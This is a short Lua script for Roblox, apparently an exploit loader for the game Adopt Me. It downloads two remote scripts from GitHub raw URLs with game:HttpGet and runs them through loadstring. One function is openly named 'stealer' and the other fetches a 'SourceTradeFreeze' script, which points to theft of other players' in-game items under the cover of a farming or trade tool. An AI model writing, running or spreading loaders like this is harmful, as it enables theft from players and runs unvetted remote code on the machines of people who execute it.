local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/HiraHub/refs/heads/main/AdoptMeScript.lua'))()
end

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/SourceTradeFreeze/refs/heads/main/script.lua'))()
end

task.spawn(stealer)

for i = 1, 1 do
    task.spawn(farm)
end
